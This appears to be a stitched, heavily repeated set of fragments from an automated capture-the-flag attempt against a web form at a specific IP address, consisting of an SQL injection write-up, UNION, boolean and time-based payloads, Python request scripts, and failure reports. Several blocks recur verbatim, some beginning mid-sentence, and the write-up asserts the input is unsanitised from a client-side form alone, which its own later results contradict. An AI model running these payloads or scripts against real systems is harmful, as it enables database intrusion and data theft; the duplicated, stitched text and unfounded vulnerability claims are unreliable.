SQL Injection Vulnerability\n\n### Vulnerability Description:\nThe form's \"query\" input field does not appear to have any sanitization or validation measures in place. Given that the form's backend query uses the input directly in a SQL query, this setup is highly susceptible to SQL injection. An attacker can potentially manipulate the input to execute arbitrary SQL commands to retrieve the contents of the 'flag' column.\n\n### Source Code: \n```html\n<a> Give me your flag, I will tell you if the flag is right. </a>\n<form action=\"\" method=\"post\">\n  <input name=\"query\" type=\"text\"/>\n  <input type=\"submit\"/>\n</form>\n```\n\n### Attack Code:\nTo confirm the vulnerability and exploit it, we can use the following SQL injection techniques iteratively to check the database structure and retrieve the 'flag' value.\n\n1. **Initial Test for SQL Injection**:\n   Submit an input to the query field to test if SQL injection is possible:\n\n   ```\n   ' OR 1=1 --\n   ```\n\n2. **Discovering Table Names**:\n   Use a UNION-based SQL Injection to discover table names:\n\n   ```\n   ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--\n   ```\n\n   or to brute force with known tables:\n   \n   ```\n   ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1, 1 --\n   ```\n\n3. **Discovering Column Names**:\n   After identifying the table name, discover column names within that table:\n\n   ```\n   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='identified_table'--\n   ```\n\n4. **Extracting the 'Flag' Value**:\n   Once the 'flag' column is confirmed, retrieve its contents:\n\n   ```\n   ' UNION SELECT flag FROM identified_table--\n   ```\n\n### Exploitation Steps:\n1. **Submit Initial SQL Injection Test**:\n   Enter the following payload in the \"query\" input field to check if SQL injection is possible:\n\n   ```\n   ' OR 1=1 --\n   ```\n\n   Observe if the website returns any indication of successful manipulation or any error messages.\n\n2. **Identify Table Names**:\n   If the initial test is successful, modify the payload to:\n\n   ```\n   ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--\n   ```\n\n   Submit the form and inspect the response to identify table names.\n\n3. **Identify Column Names**:\n   Replace `'identified_table'` with the table name discovered in step 2:\n\n   ```\n   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='identified_table'--\n   ```\n\n   Submit the form and take note of the column names.\n\n4. **Retrieve the Flag**:\n   Replace `'identified_table'` with the actual table name and `'flag'` with the identified column name:\n\n   ```\n   ' UNION SELECT flag FROM identified_table--\n   ```\n\n   Submit the form and capture the value returned for the 'flag' column.\n\nBy following these steps, the vulnerabilities revealed in the source code can be exploited to retrieve the desired 'flag' value from the database.",

The methods tried include:\n\n1. Simple SQL Injection Test:\n   - Payload: `' OR 1=1 --`\n   - Outcome: Response indicated failure (\"Nonono.\")\n\n2. UNION-based SQL Injection to Discover Table Names:\n   - Payload: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --`\n   - Outcome: Same failure response.\n\n3. Boolean-based SQL Injection:\n   - Payload: `' AND 1=1 --`\n   - Outcome: Same failure response.\n\n### Key Problems and Observations:\n- **Consistent Failure:** Every payload attempt is met with a consistent \"Nonono.\" response, meaning the backend is likely filtering or sanitizing inputs effectively.\n- **No Visible Error Details:** There's no error details or changes in the response that might give us additional clues.\n- **Possible Input Filtering:** The backend may have input filtering or sanitization to prevent common SQL injection attacks.\n\n### Next Steps:\nSince the direct SQL injection attempts have not succeeded, we need to refine our strategy. We can consider alternative approaches:\n1. **Error-Based SQL Injection:**\n   - Purpose: Force the backend to reveal more error details by using intentional syntax errors.\n2. **Time-Based Blind SQL Injection:**\n   - Purpose: Evaluate responses based on time delays, which could indicate successful injection even without visible changes.\n\n### Further Attempts:\n1. **Error-Based SQL Injection:**\n   - Try injecting payloads that aim to force an error message from the backend to get more insight.\n\n   ```python\n   import requests\n\n   url = \"http://47.251.44.45:40312\"\n   payload = \"' OR 1=1; --\"\n   data = {'query': payload}\n\n   response = requests.post(url, data=data)\n   print(response.text)\n   ```\n\n2. **Time-Based Blind SQL Injection:**\n   - Use payloads that incorporate time delays to detect successful injection.\n\n   ```python\n   import requests\n\n   url = \"http://47.251.44.45:40312\"\n   payload = \"'; IF 1=1 SLEEP(5); --\"\n   data = {'query': payload}\n\n   response = requests.post(url, data=data)\n   print(response.elapsed.total_seconds())\n   ```\n\nReplicating these queries should reveal more about the database's behavior and help identify potential weaknesses in the input handling mechanisms.",

Here\u2019s what we\u2019ve attempted:\n\n1. **Simple SQL Injection Test:**\n   - Payload: `' OR 1=1 --`\n   - Outcome: Response: \u201cNonono.\u201d\n\n2. **Union-based SQL Injection to Discover Table Names:**\n   - Payload: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --`\n   - Outcome: Same failure response.\n\n3. **Boolean-based SQL Injection:**\n   - Payload: `' AND 1=1 --`\n   - Outcome: Same failure response.\n\n4. **Error-based SQL Injection:**\n   - Payload: `' OR 1=1; --`\n   - Outcome: Same failure response.\n\n5. **Time-based Blind SQL Injection:**\n   - Payload: `'; IF 1=1 SLEEP(5); --`\n   - Response Time: ~0.45 seconds (no significant delay).\n\n6. **Polyglot Payloads and HTTP Header Manipulation:**\n   - Payload: `' OR 1=1 UNION SELECT null,null,null --`\n   - Outcome: Same failure response.\n   - Advanced Polyglot with Headers: `' AND 1=0 UNION SELECT null,null,null --`\n   - Outcome: Same failure response.\n\n### Analysis:\n\n#### Key Observations:\n- **Consistent Failure Response:** Every payload returned the same \u201cNonono.\u201d response, indicating the presence of strong input filtering or sanitization on the backend.\n- **No Error Details:** No detailed error messages or varying responses were provided, making it difficult to infer backend behavior.\n- **Time Delay Not Effective:** The time-based approach did not result in the expected delay, suggesting the backend may be ignoring or neutralizing the time functions in SQL.\n\n### Lessons Learned:\n- **Strong Protection Present:** The backend likely has robust defenses against common SQL injection techniques, including sanitization and validation.\n- **Lack of Feedback:** The consistent \u201cNonono.\u201d response provides little feedback, suggesting a controlled or filtered environment.\n  \n### Useful Information Obtained:\n- **Header Information:** Headers indicate the backend is powered by PHP and uses Nginx.\n- **Cookie Information:** Cookies and caching headers could be a clue, indicating session handling which may also include security measures.\n- **Filtered Input:** Generic payloads are being filtered, and potentially more sanitized or transformed before execution.\n\n### Conclusion:\nGiven the consistent failures, it\u2019s clear that direct SQL injection attacks are being well-handled by the backend. Future attempts should focus on more unconventional techniques or a deeper understanding of the application logic to find other potential vulnerabilities or entry points.\n\n### Next Steps:\n1. **Broader Reconnaissance:**\n   - Exploration of other input fields, parameters, or endpoints on the site.\n   - Reviewing cookies, sessions, or hidden parameters that might influence backend logic.\n\n2. **Advanced Techniques:**\n   - Explore second-order SQL injection or leveraging lesser-known vectors.\n   - Consider exploiting other types of vulnerabilities (e.g., Command Injection, XSS) that might provide more opportunities.\n\n3. **Collaborative Effort:**\n   - Interactive and iterative manual testing alongside automated tools.\n   - Engaging additional expertise or knowledge to think of unorthodox approaches.\n\nBy diversifying our attack vectors and fully understanding the application\u2019s behavior, we can hopefully identify a new pathway to extract the desired information from the database.",

SQL Injection Vulnerability\n\n### Vulnerability Description:\nThe form's \"query\" input field does not appear to have any sanitization or validation measures in place. Given that the form's backend query uses the input directly in a SQL query, this setup is highly susceptible to SQL injection. An attacker can potentially manipulate the input to execute arbitrary SQL commands to retrieve the contents of the 'flag' column.\n\n### Source Code: \n```html\n<a> Give me your flag, I will tell you if the flag is right. </a>\n<form action=\"\" method=\"post\">\n  <input name=\"query\" type=\"text\"/>\n  <input type=\"submit\"/>\n</form>\n```\n\n### Attack Code:\nTo confirm the vulnerability and exploit it, we can use the following SQL injection techniques iteratively to check the database structure and retrieve the 'flag' value.\n\n1. **Initial Test for SQL Injection**:\n   Submit an input to the query field to test if SQL injection is possible:\n\n   ```\n   ' OR 1=1 --\n   ```\n\n2. **Discovering Table Names**:\n   Use a UNION-based SQL Injection to discover table names:\n\n   ```\n   ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--\n   ```\n\n   or to brute force with known tables:\n   \n   ```\n   ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1, 1 --\n   ```\n\n3. **Discovering Column Names**:\n   After identifying the table name, discover column names within that table:\n\n   ```\n   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='identified_table'--\n   ```\n\n4. **Extracting the 'Flag' Value**:\n   Once the 'flag' column is confirmed, retrieve its contents:\n\n   ```\n   ' UNION SELECT flag FROM identified_table--\n   ```\n\n### Exploitation Steps:\n1. **Submit Initial SQL Injection Test**:\n   Enter the following payload in the \"query\" input field to check if SQL injection is possible:\n\n   ```\n   ' OR 1=1 --\n   ```\n\n   Observe if the website returns any indication of successful manipulation or any error messages.\n\n2. **Identify Table Names**:\n   If the initial test is successful, modify the payload to:\n\n   ```\n   ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--\n   ```\n\n   Submit the form and inspect the response to identify table names.\n\n3. **Identify Column Names**:\n   Replace `'identified_table'` with the table name discovered in step 2:\n\n   ```\n   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='identified_table'--\n   ```\n\n   Submit the form and take note of the column names.\n\n4. **Retrieve the Flag**:\n   Replace `'identified_table'` with the actual table name and `'flag'` with the identified column name:\n\n   ```\n   ' UNION SELECT flag FROM identified_table--\n   ```\n\n   Submit the form and capture the value returned for the 'flag' column.\n\nBy following these steps, the vulnerabilities revealed in the source code can be exploited to retrieve the desired 'flag' value from the database.",

The methods tried include:\n\n1. Simple SQL Injection Test:\n   - Payload: `' OR 1=1 --`\n   - Outcome: Response indicated failure (\"Nonono.\")\n\n2. UNION-based SQL Injection to Discover Table Names:\n   - Payload: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --`\n   - Outcome: Same failure response.\n\n3. Boolean-based SQL Injection:\n   - Payload: `' AND 1=1 --`\n   - Outcome: Same failure response.\n\n### Key Problems and Observations:\n- **Consistent Failure:** Every payload attempt is met with a consistent \"Nonono.\" response, meaning the backend is likely filtering or sanitizing inputs effectively.\n- **No Visible Error Details:** There's no error details or changes in the response that might give us additional clues.\n- **Possible Input Filtering:** The backend may have input filtering or sanitization to prevent common SQL injection attacks.\n\n### Next Steps:\nSince the direct SQL injection attempts have not succeeded, we need to refine our strategy. We can consider alternative approaches:\n1. **Error-Based SQL Injection:**\n   - Purpose: Force the backend to reveal more error details by using intentional syntax errors.\n2. **Time-Based Blind SQL Injection:**\n   - Purpose: Evaluate responses based on time delays, which could indicate successful injection even without visible changes.\n\n### Further Attempts:\n1. **Error-Based SQL Injection:**\n   - Try injecting payloads that aim to force an error message from the backend to get more insight.\n\n   ```python\n   import requests\n\n   url = \"http://47.251.44.45:40312\"\n   payload = \"' OR 1=1; --\"\n   data = {'query': payload}\n\n   response = requests.post(url, data=data)\n   print(response.text)\n   ```\n\n2. **Time-Based Blind SQL Injection:**\n   - Use payloads that incorporate time delays to detect successful injection.\n\n   ```python\n   import requests\n\n   url = \"http://47.251.44.45:40312\"\n   payload = \"'; IF 1=1 SLEEP(5); --\"\n   data = {'query': payload}\n\n   response = requests.post(url, data=data)\n   print(response.elapsed.total_seconds())\n   ```\n\nReplicating these queries should reveal more about the database's behavior and help identify potential weaknesses in the input handling mechanisms.",

Future attempts should focus on more unconventional techniques or a deeper understanding of the application logic to find other potential vulnerabilities or entry points.\n\n### Next Steps:\n1. **Broader Reconnaissance:**\n   - Exploration of other input fields, parameters, or endpoints on the site.\n   - Reviewing cookies, sessions, or hidden parameters that might influence backend logic.\n\n2. **Advanced Techniques:**\n   - Explore second-order SQL injection or leveraging lesser-known vectors.\n   - Consider exploiting other types of vulnerabilities (e.g., Command Injection, XSS) that might provide more opportunities.\n\n3. **Collaborative Effort:**\n   - Interactive and iterative manual testing alongside automated tools.\n   - Engaging additional expertise or knowledge to think of unorthodox approaches.\n\nBy diversifying our attack vectors and fully understanding the application\u2019s behavior, we can hopefully identify a new pathway to extract the desired information from the database.",

An attacker can potentially manipulate the input to execute arbitrary SQL commands to retrieve the contents of the 'flag' column.\n\n### Source Code: \n```html\n<a> Give me your flag, I will tell you if the flag is right. </a>\n<form action=\"\" method=\"post\">\n  <input name=\"query\" type=\"text\"/>\n  <input type=\"submit\"/>\n</form>\n```\n\n### Attack Code:\nTo confirm the vulnerability and exploit it, we can use the following SQL injection techniques iteratively to check the database structure and retrieve the 'flag' value.\n\n1. **Initial Test for SQL Injection**:\n   Submit an input to the query field to test if SQL injection is possible:\n\n   ```\n   ' OR 1=1 --\n   ```\n\n2. **Discovering Table Names**:\n   Use a UNION-based SQL Injection to discover table names:\n\n   ```\n   ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--\n   ```\n\n   or to brute force with known tables:\n   \n   ```\n   ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1, 1 --\n   ```\n\n3. **Discovering Column Names**:\n   After identifying the table name, discover column names within that table:\n\n   ```\n   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='identified_table'--\n   ```\n\n4. **Extracting the 'Flag' Value**:\n   Once the 'flag' column is confirmed, retrieve its contents:\n\n   ```\n   ' UNION SELECT flag FROM identified_table--\n   ```\n\n### Exploitation Steps:\n1. **Submit Initial SQL Injection Test**:\n   Enter the following payload in the \"query\" input field to check if SQL injection is possible:\n\n   ```\n   ' OR 1=1 --\n   ```\n\n   Observe if the website returns any indication of successful manipulation or any error messages.\n\n2. **Identify Table Names**:\n   If the initial test is successful, modify the payload to:\n\n   ```\n   ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--\n   ```\n\n   Submit the form and inspect the response to identify table names.\n\n3. **Identify Column Names**:\n   Replace `'identified_table'` with the table name discovered in step 2:\n\n   ```\n   ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='identified_table'--\n   ```\n\n   Submit the form and take note of the column names.\n\n4. **Retrieve the Flag**:\n   Replace `'identified_table'` with the actual table name and `'flag'` with the identified column name:\n\n   ```\n   ' UNION SELECT flag FROM identified_table--\n   ```\n\n   Submit the form and capture the value returned for the 'flag' column.\n\nBy following these steps, the vulnerabilities revealed in the source code can be exploited to retrieve the desired 'flag' value from the database.",

The methods tried include:\n\n1. Simple SQL Injection Test:\n   - Payload: `' OR 1=1 --`\n   - Outcome: Response indicated failure (\"Nonono.\")\n\n2. UNION-based SQL Injection to Discover Table Names:\n   - Payload: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --`\n   - Outcome: Same failure response.\n\n3. Boolean-based SQL Injection:\n   - Payload: `' AND 1=1 --`\n   - Outcome: Same failure response.\n\n### Key Problems and Observations:\n- **Consistent Failure:** Every payload attempt is met with a consistent \"Nonono.\" response, meaning the backend is likely filtering or sanitizing inputs effectively.\n- **No Visible Error Details:** There's no error details or changes in the response that might give us additional clues.\n- **Possible Input Filtering:** The backend may have input filtering or sanitization to prevent common SQL injection attacks.\n\n### Next Steps:\nSince the direct SQL injection attempts have not succeeded, we need to refine our strategy. We can consider alternative approaches:\n1. **Error-Based SQL Injection:**\n   - Purpose: Force the backend to reveal more error details by using intentional syntax errors.\n2. **Time-Based Blind SQL Injection:**\n   - Purpose: Evaluate responses based on time delays, which could indicate successful injection even without visible changes.\n\n### Further Attempts:\n1. **Error-Based SQL Injection:**\n   - Try injecting payloads that aim to force an error message from the backend to get more insight.\n\n   ```python\n   import requests\n\n   url = \"http://47.251.44.45:40312\"\n   payload = \"' OR 1=1; --\"\n   data = {'query': payload}\n\n   response = requests.post(url, data=data)\n   print(response.text)\n   ```\n\n2. **Time-Based Blind SQL Injection:**\n   - Use payloads that incorporate time delays to detect successful injection.\n\n   ```python\n   import requests\n\n   url = \"http://47.251.44.45:40312\"\n   payload = \"'; IF 1=1 SLEEP(5); --\"\n   data = {'query': payload}\n\n   response = requests.post(url, data=data)\n   print(response.elapsed.total_seconds())\n   ```\n\nReplicating these queries should reveal more about the database's behavior and help identify potential weaknesses in the input handling mechanisms.",

Here\u2019s what we\u2019ve attempted:\n\n1. **Simple SQL Injection Test:**\n   - Payload: `' OR 1=1 --`\n   - Outcome: Response: \u201cNonono.\u201d\n\n2. **Union-based SQL Injection to Discover Table Names:**\n   - Payload: `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --`\n   - Outcome: Same failure response.\n\n3. **Boolean-based SQL Injection:**\n   - Payload: `' AND 1=1 --`\n   - Outcome: Same failure response.\n\n4. **Error-based SQL Injection:**\n   - Payload: `' OR 1=1; --`\n   - Outcome: Same failure response.\n\n5. **Time-based Blind SQL Injection:**\n   - Payload: `'; IF 1=1 SLEEP(5); --`\n   - Response Time: ~0.45 seconds (no significant delay).\n\n6. **Polyglot Payloads and HTTP Header Manipulation:**\n   - Payload: `' OR 1=1 UNION SELECT null,null,null --`\n   - Outcome: Same failure response.\n   - Advanced Polyglot with Headers: `' AND 1=0 UNION SELECT null,null,null --`\n   - Outcome: Same failure response.\n\n### Analysis:\n\n#### Key Observations:\n- **Consistent Failure Response:** Every payload returned the same \u201cNonono.\u201d response, indicating the presence of strong input filtering or sanitization on the backend.\n- **No Error Details:** No detailed error messages or varying responses were provided, making it difficult to infer backend behavior.\n- **Time Delay Not Effective:** The time-based approach did not result in the expected delay, suggesting the backend may be ignoring or neutralizing the time functions in SQL.\n\n### Lessons Learned:\n- **Strong Protection Present:** The backend likely has robust defenses against common SQL injection techniques, including sanitization and validation.\n- **Lack of Feedback:** The consistent \u201cNonono.\u201d response provides little feedback, suggesting a controlled or filtered environment.\n  \n### Useful Information Obtained:\n- **Header Information:** Headers indicate the backend is powered by PHP and uses Nginx.\n- **Cookie Information:** Cookies and caching headers could be a clue, indicating session handling which may also include security measures.\n- **Filtered Input:** Generic payloads are being filtered, and potentially more sanitized or transformed before execution.\n\n### Conclusion:\nGiven the consistent failures, it\u2019s clear that direct SQL injection attacks are being well-handled by the backend. Future attempts should focus on more unconventional techniques or a deeper understanding of the application logic to find other potential vulnerabilities or entry points.\n\n### Next Steps:\n1. **Broader Reconnaissance:**\n   - Exploration of other input fields, parameters, or endpoints on the site.\n   - Reviewing cookies, sessions, or hidden parameters that might influence backend logic.\n\n2. **Advanced Techniques:**\n   - Explore second-order SQL injection or leveraging lesser-known vectors.\n   - Consider exploiting other types of vulnerabilities (e.g., Command Injection, XSS) that might provide more opportunities.\n\n3. **Collaborative Effort:**\n   - Interactive and iterative manual testing alongside automated tools.\n   - Engaging additional expertise or knowledge to think of unorthodox approaches.\n\nBy diversifying our attack vectors and fully understanding the application\u2019s behavior, we can hopefully identify a new pathway to extract the desired information from the database.",
